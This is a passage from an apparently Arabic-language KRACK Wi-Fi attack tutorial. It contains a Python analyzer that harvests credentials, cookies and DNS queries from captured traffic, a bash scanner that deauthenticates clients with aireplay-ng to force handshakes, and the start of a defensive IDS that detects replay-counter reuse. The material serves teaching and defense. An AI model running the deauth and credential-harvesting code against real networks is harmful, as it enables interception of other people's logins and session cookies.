                self.analyze_dns(pkt)
            
            # البحث عن بيانات اعتماد
            if pkt.haslayer(Raw):
                self.extract_credentials(pkt)
        
        # طباعة النتائج
        self.print_results()
    
    def analyze_http(self, pkt):
        """تحليل طلبات HTTP"""
        
        try:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # طلبات HTTP
            if payload.startswith('GET') or payload.startswith('POST'):
                lines = payload.split('\r\n')
                method_line = lines[0]
                
                # استخراج الرؤوس
                headers = {}
                for line in lines[1:]:
                    if ': ' in line:
                        key, value = line.split(': ', 1)
                        headers[key] = value
                
                self.http_requests.append({
                    'method': method_line,
                    'host': headers.get('Host', 'Unknown'),
                    'user_agent': headers.get('User-Agent', 'Unknown'),
                    'cookie': headers.get('Cookie'),
                    'full_payload': payload[:500]  # أول 500 حرف
                })
                
                # استخراج الكوكيز
                if 'Cookie' in headers:
                    self.cookies.append({
                        'host': headers.get('Host'),
                        'cookies': headers['Cookie']
                    })
        
        except:
            pass
    
    def analyze_dns(self, pkt):
        """تحليل استعلامات DNS"""
        
        try:
            if pkt.haslayer(DNSQR):
                query = pkt[DNSQR].qname.decode('utf-8')
                self.dns_queries.append(query)
        except:
            pass
    
    def extract_credentials(self, pkt):
        """استخراج بيانات الاعتماد"""
        
        try:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # البحث عن أنماط شائعة
            patterns = [
                r'(username|user|email)=([^&\s]+)',
                r'(password|pass|pwd)=([^&\s]+)',
                r'(login|signin).*?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, payload, re.IGNORECASE)
                if matches:
                    self.credentials.append({
                        'pattern': pattern,
                        'matches': matches,
                        'context': payload[:200]
                    })
        
        except:
            pass
    
    def print_results(self):
        """طباعة نتائج التحليل"""
        
        print("\n" + "═" * 70)
        print("  POST-KRACK TRAFFIC ANALYSIS")
        print("═" * 70 + "\n")
        
        # HTTP Requests
        if self.http_requests:
            print(f"[+] HTTP Requests Captured: {len(self.http_requests)}")
            print("─" * 70)
            
            for i, req in enumerate(self.http_requests[:10], 1):  # أول 10
                print(f"\n  Request #{i}:")
                print(f"    Method: {req['method']}")
                print(f"    Host: {req['host']}")
                print(f"    User-Agent: {req['user_agent'][:50]}...")
                if req['cookie']:
                    print(f"    Cookie: {req['cookie'][:60]}...")
        
        # DNS Queries
        if self.dns_queries:
            print(f"\n\n[+] DNS Queries: {len(set(self.dns_queries))}")
            print("─" * 70)
            
            unique_domains = set(self.dns_queries)
            for domain in sorted(unique_domains)[:20]:  # أول 20
                print(f"    • {domain}")
        
        # Credentials
        if self.credentials:
            print(f"\n\n[!] Potential Credentials Found: {len(self.credentials)}")
            print("─" * 70)
            print("⚠  WARNING: This data may contain sensitive information!")
            
            for i, cred in enumerate(self.credentials[:5], 1):
                print(f"\n  Match #{i}:")
                print(f"    Pattern: {cred['pattern']}")
                print(f"    Data: {cred['matches']}")
        
        # Cookies
        if self.cookies:
            print(f"\n\n[+] Cookies Captured: {len(self.cookies)}")
            print("─" * 70)
            
            for i, cookie in enumerate(self.cookies[:5], 1):
                print(f"\n  Cookie #{i}:")
                print(f"    Host: {cookie['host']}")
                print(f"    Data: {cookie['cookies'][:80]}...")
        
        print("\n" + "═" * 70)
    

    def export_to_html(self, output_file="krack_analysis_report.html"):
        """تصدير النتائج كتقرير HTML"""
        
        html_content = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KRACK Attack Analysis Report</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1e1e1e;
            color: #e0e0e0;
            padding: 20px;
            direction: ltr;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: #2d2d2d;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }}
        h1 {{
            color: #ff6b6b;
            border-bottom: 3px solid #ff6b6b;
            padding-bottom: 10px;
        }}
        h2 {{
            color: #4ecdc4;
            margin-top: 30px;
        }}
        .stat-box {{
            background: #363636;
            padding: 15px;
            margin: 10px 0;
            border-left: 4px solid #4ecdc4;
            border-radius: 5px;
        }}
        .warning {{
            background: #ff6b6b;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }}
        .data-item {{
            background: #404040;
            padding: 10px;
            margin: 5px 0;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        .credential {{
            background: #5a3030;
            border-left: 4px solid #ff6b6b;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #404040;
        }}
        th {{
            background: #363636;
            color: #4ecdc4;
        }}
        .timestamp {{
            color: #888;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 KRACK Attack Analysis Report</h1>
        <div class="timestamp">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
        
        <div class="warning">
            ⚠️ <strong>WARNING:</strong> This report contains sensitive data captured from network traffic. 
            Handle with extreme care and ensure proper authorization before conducting such analysis.
        </div>
        
        <h2>📊 Statistics</h2>
        <div class="stat-box">
            <strong>Total Packets Analyzed:</strong> {len(self.packets)}<br>
            <strong>HTTP Requests:</strong> {len(self.http_requests)}<br>
            <strong>DNS Queries:</strong> {len(set(self.dns_queries))}<br>
            <strong>Potential Credentials:</strong> {len(self.credentials)}<br>
            <strong>Cookies Captured:</strong> {len(self.cookies)}
        </div>
        
        <h2>🌐 HTTP Requests</h2>
        <table>
            <tr>
                <th>#</th>
                <th>Method</th>
                <th>Host</th>
                <th>User-Agent</th>
            </tr>
"""
        
        for i, req in enumerate(self.http_requests[:50], 1):
            html_content += f"""
            <tr>
                <td>{i}</td>
                <td><code>{req['method'].split()[0]}</code></td>
                <td>{req['host']}</td>
                <td>{req['user_agent'][:80]}</td>
            </tr>
"""
        
        html_content += """
        </table>
        
        <h2>🔍 DNS Queries</h2>
"""
        
        unique_domains = sorted(set(self.dns_queries))
        for domain in unique_domains[:100]:
            html_content += f'        <div class="data-item">• {domain}</div>\n'
        
        if self.credentials:
            html_content += """
        <h2>🚨 Credentials & Sensitive Data</h2>
        <div class="warning">
            The following data may contain passwords and sensitive information!
        </div>
"""
            
            for i, cred in enumerate(self.credentials, 1):
                html_content += f"""
        <div class="data-item credential">
            <strong>Match #{i}:</strong><br>
            <code>{cred['matches']}</code>
        </div>
"""
        
        if self.cookies:
            html_content += """
        <h2>🍪 Captured Cookies</h2>
"""
            
            for i, cookie in enumerate(self.cookies[:20], 1):
                html_content += f"""
        <div class="data-item">
            <strong>Host:</strong> {cookie['host']}<br>
            <code>{cookie['cookies'][:200]}...</code>
        </div>
"""
        
        html_content += """
    </div>
</body>
</html>
"""
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"\n[✓] HTML report saved to: {output_file}")

def main():
    """الدالة الرئيسية"""
    
    if len(sys.argv) != 2:
        print("Usage: python3 post_krack_analyzer.py <pcap_file>")
        print("\nExample:")
        print("  python3 post_krack_analyzer.py krack_capture.pcap")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    
    if not os.path.exists(pcap_file):
        print(f"[-] File not found: {pcap_file}")
        sys.exit(1)
    
    # إنشاء المحلل
    analyzer = PostKRACKAnalyzer(pcap_file)
    
    # تحليل البيانات
    analyzer.analyze_all()
    
    # تصدير التقرير
    analyzer.export_to_html()
    
    print("\n[*] Analysis complete!")

if __name__ == "__main__":
    main()
```

---

## التمرين 7: اختبار الأجهزة المختلفة للثغرة {#تمرين-7-اختبار-الأجهزة}

### الهدف
بناء أداة لفحص مختلف الأجهزة وتحديد مدى تأثرها بثغرة KRACK.

### 7.1 سكريبت الفحص الشامل

```bash
#!/bin/bash
#
# krack_vulnerability_scanner.sh - فاحص ثغرة KRACK
# يختبر الأجهزة المتصلة بالشبكة للتحقق من تأثرها بـ KRACK
#

set -e

# الألوان
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# المتغيرات العامة
INTERFACE=""
RESULTS_DIR="krack_scan_results_$(date +%Y%m%d_%H%M%S)"
VULNERABLE_DEVICES=()
PATCHED_DEVICES=()

# الدوال المساعدة
print_banner() {
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║         KRACK Vulnerability Scanner v1.0                 ║"
    echo "║         Educational Purpose Only                          ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

check_requirements() {
    print_status "Checking requirements..."
    
    local tools=("airmon-ng" "airodump-ng" "python3" "tshark")
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            print_error "$tool is not installed!"
            exit 1
        fi
    done
    
    if [ "$EUID" -ne 0 ]; then
        print_error "This script must be run as root!"
        exit 1
    fi
    
    print_success "All requirements met"
}

setup_environment() {
    print_status "Setting up environment..."
    
    # إنشاء مجلد النتائج
    mkdir -p "$RESULTS_DIR"
    
    # إيقاف الخدمات المتداخلة
    systemctl stop NetworkManager 2>/dev/null || true
    killall wpa_supplicant 2>/dev/null || true
    
    # تفعيل monitor mode
    airmon-ng check kill > /dev/null 2>&1
    airmon-ng start "$INTERFACE" > /dev/null 2>&1
    
    MONITOR_INTERFACE="${INTERFACE}mon"
    
    print_success "Environment ready (Monitor: $MONITOR_INTERFACE)"
}

discover_networks() {
    print_status "Discovering networks (30 seconds)..."
    
    local output_file="$RESULTS_DIR/networks"
    
    timeout 30 airodump-ng \
        --write "$output_file" \
        --output-format csv \
        "$MONITOR_INTERFACE" > /dev/null 2>&1 || true
    
    # قراءة النتائج
    if [ -f "${output_file}-01.csv" ]; then
        local network_count=$(grep -c "WPA2" "${output_file}-01.csv" 2>/dev/null || echo "0")
        print_success "Found $network_count WPA2 networks"
        
        # عرض الشبكات
        echo ""
        echo -e "${BLUE}Discovered Networks:${NC}"
        echo "─────────────────────────────────────────────────────────"
        
        grep "WPA2" "${output_file}-01.csv" 2>/dev/null | \
            awk -F',' '{print $1 " | " $14}' | \
            head -n 10
        
        echo "─────────────────────────────────────────────────────────"
    else
        print_error "No networks discovered"
        return 1
    fi
}

test_device() {
    local bssid=$1
    local client=$2
    local channel=$3
    local ssid=$4
    
    print_status "Testing: $ssid ($bssid) - Client: $client"
    
    # إنشاء ملف مؤقت للالتقاط
    local capture_file="$RESULTS_DIR/test_${bssid//:/_}_${client//:/_}"
    
    # التبديل إلى القناة
    iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null
    
    # Deauth لإجبار إعادة الاتصال
    print_status "  → Deauthenticating client..."
    aireplay-ng --deauth 5 \
        -a "$bssid" \
        -c "$client" \
        "$MONITOR_INTERFACE" > /dev/null 2>&1 &
    
    local deauth_pid=$!
    
    # التقاط المصافحة
    print_status "  → Capturing handshake..."
    timeout 60 airodump-ng \
        --bssid "$bssid" \
        --channel "$channel" \
        --write "$capture_file" \
        "$MONITOR_INTERFACE" > /dev/null 2>&1 || true
    
    # إيقاف deauth
    kill $deauth_pid 2>/dev/null || true
    
    # تحليل الالتقاط
    if [ -f "${capture_file}-01.cap" ]; then
        # استخدام Python script للتحليل
        python3 - <<EOF
from scapy.all import *
import sys

pcap = "${capture_file}-01.cap"
packets = rdpcap(pcap)

eapol_count = len([p for p in packets if p.haslayer(EAPOL)])
msg3_count = 0

for pkt in packets:
    if pkt.haslayer(EAPOL):
        try:
            raw = bytes(pkt[EAPOL])
            key_info = struct.unpack('>H', raw[5:7])[0]
            
            # Message 3: Install=1, ACK=1, MIC=1, Secure=1
            if (key_info & 0x01C0) == 0x01C0:
                msg3_count += 1
        except:
            pass

print(f"EAPOL:{eapol_count}")
print(f"MSG3:{msg3_count}")

if eapol_count >= 4:
    print("HANDSHAKE:YES")
else:
    print("HANDSHAKE:NO")

if msg3_count > 1:
    print("VULNERABLE:POSSIBLE")
else:
    print("VULNERABLE:NO")
EOF
        
        # قراءة النتائج
        local result=$(python3 - <<EOF
from scapy.all import *
pcap = "${capture_file}-01.cap"
try:
    packets = rdpcap(pcap)
    msg3_count = 0
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            try:
                raw = bytes(pkt[EAPOL])
                key_info = struct.unpack('>H', raw[5:7])[0]
                if (key_info & 0x01C0) == 0x01C0:
                    msg3_count += 1
            except:
                pass
    
    if msg3_count > 1:
        print("VULNERABLE")
    elif msg3_count == 1:
        print("LIKELY_PATCHED")
    else:
        print("UNKNOWN")
except:
    print("ERROR")
EOF
)
        
        case "$result" in
            "VULNERABLE")
                print_warning "  ⚠ Device appears VULNERABLE to KRACK!"
                VULNERABLE_DEVICES+=("$ssid|$bssid|$client")
                ;;
            "LIKELY_PATCHED")
                print_success "  ✓ Device appears PATCHED"
                PATCHED_DEVICES+=("$ssid|$bssid|$client")
                ;;
            *)
                print_status "  ? Could not determine vulnerability"
                ;;
        esac
    else
        print_error "  ✗ Failed to capture traffic"
    fi
    
    echo ""
}

scan_network() {
    local target_bssid=$1
    local target_channel=$2
    
    print_status "Scanning network: $target_bssid on channel $target_channel"
    
    # التقاط العملاء
    local clients_file="$RESULTS_DIR/clients_${target_bssid//:/_}"
    
    timeout 30 airodump-ng \
        --bssid "$target_bssid" \
        --channel "$target_channel" \
        --write "$clients_file" \
        --output-format csv \
        "$MONITOR_INTERFACE" > /dev/null 2>&1 || true
    
    # استخراج العملاء من ملف CSV
    if [ -f "${clients_file}-01.csv" ]; then
        # البحث عن العملاء المتصلين
        local clients=$(awk -F',' '/Station MAC/{flag=1; next} flag && NF>5 {print $1}' \
            "${clients_file}-01.csv" | \
            grep -v "Station MAC" | \
            grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | \
            head -n 5)
        
        if [ -n "$clients" ]; then
            print_success "Found $(echo "$clients" | wc -l) connected clients"
            
            # اختبار كل عميل
            while IFS= read -r client; do
                client=$(echo "$client" | tr -d ' ')
                if [ -n "$client" ]; then
                    test_device "$target_bssid" "$client" "$target_channel" "TestNetwork"
                fi
            done <<< "$clients"
        else
            print_warning "No active clients found on this network"
        fi
    fi
}

generate_report() {
    print_status "Generating report..."
    
    local report_file="$RESULTS_DIR/vulnerability_report.txt"
    
    cat > "$report_file" <<EOF
╔══════════════════════════════════════════════════════════════╗
║            KRACK Vulnerability Scan Report                   ║
╚══════════════════════════════════════════════════════════════╝

Scan Date: $(date)
Interface: $INTERFACE
Results Directory: $RESULTS_DIR

═══════════════════════════════════════════════════════════════

SUMMARY:
────────────────────────────────────────────────────────────────
  Vulnerable Devices: ${#VULNERABLE_DEVICES[@]}
  Patched Devices: ${#PATCHED_DEVICES[@]}

EOF
    
    if [ ${#VULNERABLE_DEVICES[@]} -gt 0 ]; then
        cat >> "$report_file" <<EOF

⚠ VULNERABLE DEVICES:
────────────────────────────────────────────────────────────────
EOF
        
        for device in "${VULNERABLE_DEVICES[@]}"; do
            echo "  • $device" >> "$report_file"
        done
    fi
    
    if [ ${#PATCHED_DEVICES[@]} -gt 0 ]; then
        cat >> "$report_file" <<EOF

✓ PATCHED DEVICES:
────────────────────────────────────────────────────────────────
EOF
        
        for device in "${PATCHED_DEVICES[@]}"; do
            echo "  • $device" >> "$report_file"
        done
    fi
    
    cat >> "$report_file" <<EOF

═══════════════════════════════════════════════════════════════

RECOMMENDATIONS:
────────────────────────────────────────────────────────────────
1. Update all vulnerable devices immediately
2. Enable automatic security updates
3. Consider upgrading to WPA3 if available
4. Implement network segmentation for IoT devices
5. Monitor for suspicious network activity

═══════════════════════════════════════════════════════════════
EOF
    
    print_success "Report saved to: $report_file"
    
    # عرض الملخص
    echo ""
    echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}              SCAN SUMMARY                            ${BLUE}║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${RED}Vulnerable Devices: ${#VULNERABLE_DEVICES[@]}${NC}"
    echo -e "  ${GREEN}Patched Devices: ${#PATCHED_DEVICES[@]}${NC}"
    echo ""
    
    if [ ${#VULNERABLE_DEVICES[@]} -gt 0 ]; then
        echo -e "${YELLOW}⚠ WARNING: Vulnerable devices detected!${NC}"
        echo -e "${YELLOW}   Please update these devices immediately.${NC}"
    else
        echo -e "${GREEN}✓ No vulnerable devices detected in this scan.${NC}"
    fi
    echo ""
}

cleanup() {
    print_status "Cleaning up..."
    
    # إيقاف monitor mode
    airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1 || true
    
    # إعادة تشغيل NetworkManager
    systemctl start NetworkManager 2>/dev/null || true
    
    print_success "Cleanup complete"
}

# البرنامج الرئيسي
main() {
    print_banner
    
    # التحقق من المعاملات
    if [ "$#" -ne 1 ]; then
        echo "Usage: sudo $0 <interface>"
        echo "Example: sudo $0 wlan0"
        exit 1
    fi
    
    INTERFACE=$1
    
    # التحقق من المتطلبات
    check_requirements
    
    # إعداد البيئة
    setup_environment
    
    # اكتشاف الشبكات
    discover_networks
    
    # طلب اختيار الشبكة للاختبار
    echo ""
    read -p "Enter BSSID to test (or 'all' to test top 3): " target_bssid
    read -p "Enter channel: " target_channel
    
    if [ "$target_bssid" = "all" ]; then
        # اختبار أول 3 شبكات
        print_warning "Auto-testing mode not fully implemented"
        print_status "Please specify a single BSSID"
    else
        # اختبار الشبكة المحددة
        scan_network "$target_bssid" "$target_channel"
    fi
    
    # إنشاء التقرير
    generate_report
    
    # التنظيف
    trap cleanup EXIT
}

# تشغيل البرنامج
main "$@"
```

**استخدام الفاحص:**

```bash
chmod +x krack_vulnerability_scanner.sh
sudo ./krack_vulnerability_scanner.sh wlan0
```

---

## التمرين 8: بناء نظام كشف KRACK {#تمرين-8-نظام-الكشف}

### الهدف
إنشاء نظام IDS (Intrusion Detection System) لكشف محاولات هجوم KRACK في الوقت الفعلي.

### 8.1 نظام كشف KRACK المتقدم

```python
#!/usr/bin/env python3
"""
krack_ids.py - نظام كشف تطفل لهجمات KRACK
Intrusion Detection System for KRACK attacks
"""

from scapy.all import *
from collections import defaultdict, deque
from datetime import datetime, timedelta
import threading
import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class KRACKDetectionSystem:
    """نظام كشف هجمات KRACK"""
    
    def __init__(self, interface, alert_email=None):
        self.interface = interface
        self.alert_email = alert_email
        
        # قواعد البيانات
        self.handshakes = defaultdict(lambda: {
            'messages': deque(maxlen=10),
            'msg3_count': 0,
            'msg3_replay_counters': [],
            'last_msg3_time': None,
            'suspicious_score': 0,
        })
        
        self.deauth_tracker = defaultdict(lambda: {
            'count': 0,
            'last_time': None,
            'sources': set(),
        })
        
        # الإنذارات
        self.alerts = []
        self.alert_threshold = 50  # درجة الخطر
        
        # الإحصائيات
        self.stats = {
            'packets_processed': 0,
            'handshakes_detected': 0,
            'krack_attempts': 0,
            'deauth_floods': 0,
            'alerts_generated': 0,
        }
        
        # الإعدادات
        self.running = True
        
    def packet_handler(self, pkt):
        """معالج الحزم الرئيسي"""
        
        self.stats['packets_processed'] += 1
        
        try:
            # كشف EAPOL
            if pkt.haslayer(EAPOL):
                self.analyze_eapol(pkt)
            
            # كشف Deauth floods
            elif pkt.haslayer(Dot11Deauth):
                self.analyze_deauth(pkt)
        
        except Exception as e:
            pass  # تجاهل الأخطاء
    
    def analyze_eapol(self, pkt):
        """تحليل حزم EAPOL لكشف KRACK"""
        
        try:
            # استخراج المعلومات
            bssid = pkt.addr1 if pkt.FCfield & 0x1 else pkt.addr2
            client = pkt.addr2 if pkt.FCfield & 0x1 else pkt.addr1
            
            key = f"{bssid}-{client}"
            
            # تحليل EAPOL
            eapol = pkt[EAPOL]
            raw = bytes(eapol)
            
            key_info = struct.unpack('>H', raw[5:7])[0]
            replay_counter = struct.unpack('>Q', raw[9:17])[0]
            
            msg_type = self._identify_message(key_info)
            
            # تسجيل الرسالة
            self.handshakes[key]['messages'].append({
                'type': msg_type,
                'timestamp': datetime.now(),
                'replay_counter': replay_counter,
                'key_info': key_info,
            })
            
            # تحليل خاص بـ Message 3
            if msg_type == 3:
                self._analyze_msg3(key, replay_counter, bssid, client)
        
        except Exception as e:
            pass
    
    def _analyze_msg3(self, key, replay_counter, bssid, client):
        """تحليل مفصل لـ Message 3"""
        
        hs = self.handshakes[key]
        hs['msg3_count'] += 1
        hs['msg3_replay_counters'].append(replay_counter)
        
        now = datetime.now()
        
        # فحص 1: عدد إعادات الإرسال
        if hs['msg3_count'] > 2:
            hs['suspicious_score'] += 20
            self._create_alert(
                severity='MEDIUM',
                alert_type='MULTIPLE_MSG3',
                description=f"Multiple Message 3 transmissions detected ({hs['msg3_count']})",
                bssid=bssid,
                client=client
            )
        
        # فحص 2: تكرار Replay Counters
        if len(hs['msg3_replay_counters']) != len(set(hs['msg3_replay_counters'])):
            hs['suspicious_score'] += 50
            self._create_alert(
                severity='HIGH',
                alert_type='DUPLICATE_REPLAY_COUNTER',
                description="Duplicate replay counters detected - Strong KRACK indicator!",
                bssid=bssid,
                client=client
            )
            self.stats['krack_attempts'] += 1
        
        # فحص 3: توقيت إعادة الإرسال
        if hs['last_msg3_time']:
            time_diff = (now - hs['last_msg3_time']).total_seconds()
            
            # إعادة إرسال سريعة جداً (< 1 ثانية)
            if time_diff < 1.0:
                hs['suspicious_score'] += 30
                self._create_alert(
                    severity='HIGH',
                    alert_type='RAPID_MSG3_RETRANSMISSION',
                    description=f"Rapid Message 3 retransmission ({time_diff:.2f}s)",
                    bssid=bssid,
                    client=client
                )
        
        hs['last_msg3_time'] = now
        
        # تنبيه إذا تجاوزنا الحد
        if hs['suspicious_score'] >= self.alert_threshold:
            self._create_critical_alert(
                description="KRACK Attack Detected!",
                bssid=bssid,
                client=client,
                score=hs['suspicious_score']
            )
    
    def analyze_deauth(self, pkt):
        """تحليل Deauth لكشف الـ floods"""
        
        try:
            target = pkt.addr1
            source = pkt.addr2
            
            tracker = self.deauth_tracker[target]
            tracker['count'] += 1
            tracker['sources'].add(source)
            tracker['last_time'] = datetime.now()
            
            # إذا تجاوزنا 10 deauth في دقيقة
            if tracker['count'] > 10:
                self._create_alert(
                    severity='MEDIUM',
                    alert_type='DEAUTH_FLOOD',
                    description=f"Deauthentication flood detected ({tracker['count']} packets)",
                    bssid=source,
                    client=target
                )
                self.stats['deauth_floods'] += 1
                
                # إعادة تعيين العداد
                tracker['count'] = 0
        
        except:
            pass
    
    def _identify_message(self, key_info):
        """تحديد نوع رسالة EAPOL"""
        install = bool(key_info & 0x0040)
        ack = bool(key_info & 0x0080)
        mic = bool(key_info & 0x0100)
        secure = bool(key_info & 0x0200)
        
        if ack and not mic:
            return 1
        elif not ack and mic and not install:
            return 2
        elif ack and mic and install and secure:
            return 3
        elif not ack and mic and secure:
            return 4
        return 0
    
    def _create_alert(self, severity, alert_type, description, bssid, client):

        """إنشاء تنبيه"""
        
        alert = {
            'timestamp': datetime.now().isoformat(),
            'severity': severity,
            'type': alert_type,
            'description': description,
            'bssid': bssid,
            'client': client,
        }
        
        self.alerts.append(alert)
        self.stats['alerts_generated'] += 1
        
        # طباعة التنبيه
        severity_colors = {
            'LOW': '\033[0;32m',      # أخضر
            'MEDIUM': '\033[1;33m',   # أصفر
            'HIGH': '\033[0;31m',     # أحمر
            'CRITICAL': '\033[1;31m', # أحمر غامق
        }
        
        color = severity_colors.get(severity, '\033[0m')
        reset = '\033[0m'
        
        print(f"\n{color}[{severity}] {alert_type}{reset}")
        print(f"  Time: {alert['timestamp']}")
        print(f"  Description: {description}")
        print(f"  AP: {bssid}")
        print(f"  Client: {client}")
    
    def _create_critical_alert(self, description, bssid, client, score):
        """إنشاء تنبيه حرج"""
        
        self._create_alert(
            severity='CRITICAL',
            alert_type='KRACK_ATTACK_CONFIRMED',
            description=f"{description} (Score: {score})",
            bssid=bssid,
            client=client
        )
        
        # إرسال بريد إلكتروني إذا تم تفعيله
        if self.alert_email:
            self._send_email_alert(description, bssid, client, score)
        
        # حفظ الأدلة
        self._save_evidence(bssid, client)
    
    def _send_email_alert(self, description, bssid, client, score):
        """إرسال تنبيه عبر البريد الإلكتروني"""
        
        try:
            # إعدادات البريد (يجب تكوينها)
            smtp_server = "smtp.gmail.com"
            smtp_port = 587
            sender_email = "your_email@gmail.com"
            sender_password = "your_app_password"
            
            # إنشاء الرسالة
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = self.alert_email
            msg['Subject'] = f"🚨 CRITICAL: KRACK Attack Detected!"
            
            body = f"""
KRACK Attack Detection Alert
════════════════════════════════════════

Severity: CRITICAL
Time: {datetime.now()}
Description: {description}
Suspicious Score: {score}

Target Details:
  • Access Point: {bssid}
  • Client Device: {client}

Recommendation:
  1. Isolate the affected client immediately
  2. Investigate the network for unauthorized access
  3. Update vulnerable devices
  4. Review security logs

This is an automated alert from KRACK IDS.
════════════════════════════════════════
"""
            
            msg.attach(MIMEText(body, 'plain'))
            
            # إرسال
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(sender_email, sender_password)
                server.send_message(msg)
            
            print(f"  [✓] Alert email sent to {self.alert_email}")
        
        except Exception as e:
            print(f"  [✗] Failed to send email: {e}")
    
    def _save_evidence(self, bssid, client):
        """حفظ الأدلة للتحليل الجنائي"""
        
        evidence_file = f"evidence_{bssid.replace(':', '')}_{client.replace(':', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        evidence = {
            'timestamp': datetime.now().isoformat(),
            'bssid': bssid,
            'client': client,
            'handshake_data': {
                'msg3_count': self.handshakes[f"{bssid}-{client}"]['msg3_count'],
                'replay_counters': self.handshakes[f"{bssid}-{client}"]['msg3_replay_counters'],
                'suspicious_score': self.handshakes[f"{bssid}-{client}"]['suspicious_score'],
            },
            'all_alerts': [a for a in self.alerts if a['bssid'] == bssid and a['client'] == client],
        }
        
        with open(evidence_file, 'w') as f:
            json.dump(evidence, f, indent=2)
        
        print(f"  [✓] Evidence saved to: {evidence_file}")
    
    def print_dashboard(self):
        """طباعة لوحة المعلومات"""
        
        while self.running:
            time.sleep(5)
            
            os.system('clear')
            
            print("╔═══════════════════════════════════════════════════════════════════╗")
            print("║              KRACK Intrusion Detection System                    ║")
            print("╚═══════════════════════════════════════════════════════════════════╝")
            
            print(f"\n  Interface: {self.interface}")
            print(f"  Running Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            print("\n┌─────────────────────────────────────────────────────────────────┐")
            print("│ STATISTICS                                                      │")
            print("├─────────────────────────────────────────────────────────────────┤")
            print(f"│  Packets Processed:      {self.stats['packets_processed']:>10}              │")
            print(f"│  Handshakes Detected:    {self.stats['handshakes_detected']:>10}              │")
            print(f"│  KRACK Attempts:         {self.stats['krack_attempts']:>10}              │")
            print(f"│  Deauth Floods:          {self.stats['deauth_floods']:>10}              │")
            print(f"│  Alerts Generated:       {self.stats['alerts_generated']:>10}              │")
            print("└─────────────────────────────────────────────────────────────────┘")
            
            # آخر التنبيهات
            if self.alerts:
                print("\n┌─────────────────────────────────────────────────────────────────┐")
                print("│ RECENT ALERTS (Last 5)                                          │")
                print("├─────────────────────────────────────────────────────────────────┤")
                
                for alert in self.alerts[-5:]:
                    severity_icon = {
                        'LOW': '🟢',
                        'MEDIUM': '🟡',
                        'HIGH': '🟠',
                        'CRITICAL': '🔴',
                    }.get(alert['severity'], '⚪')
                    
                    print(f"│ {severity_icon} [{alert['severity']}] {alert['type'][:40]:<40} │")
                    print(f"│    {alert['description'][:60]:<60} │")
                    print(f"│    AP: {alert['bssid']:<50} │")
                    print("├─────────────────────────────────────────────────────────────────┤")
                
                print("└─────────────────────────────────────────────────────────────────┘")
            
            # الأجهزة المشبوهة
            suspicious = {k: v for k, v in self.handshakes.items() if v['suspicious_score'] > 0}
            
            if suspicious:
                print("\n┌─────────────────────────────────────────────────────────────────┐")
                print("│ SUSPICIOUS DEVICES                                              │")
                print("├─────────────────────────────────────────────────────────────────┤")
                
                for device, data in sorted(suspicious.items(), 
                                          key=lambda x: x[1]['suspicious_score'], 
                                          reverse=True)[:10]:
                    score = data['suspicious_score']
                    color = '🔴' if score >= 50 else '🟡' if score >= 20 else '🟢'
                    
                    print(f"│ {color} {device[:50]:<50} Score: {score:>3} │")
                
                print("└─────────────────────────────────────────────────────────────────┘")
            
            print("\nPress Ctrl+C to stop monitoring...")
    
    def export_report(self, filename="krack_ids_report.json"):
        """تصدير تقرير شامل"""
        
        report = {
            'scan_info': {
                'interface': self.interface,
                'start_time': datetime.now().isoformat(),
            },
            'statistics': self.stats,
            'alerts': self.alerts,
            'suspicious_devices': {
                k: {
                    'msg3_count': v['msg3_count'],
                    'suspicious_score': v['suspicious_score'],
                    'replay_counters': v['msg3_replay_counters'],
                }
                for k, v in self.handshakes.items() if v['suspicious_score'] > 0
            },
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[✓] Report exported to: {filename}")
    
    def start(self):
        """بدء نظام الكشف"""
        
        print(f"[*] Starting KRACK IDS on {self.interface}...")
        print(f"[*] Alert threshold: {self.alert_threshold}")
        if self.alert_email:
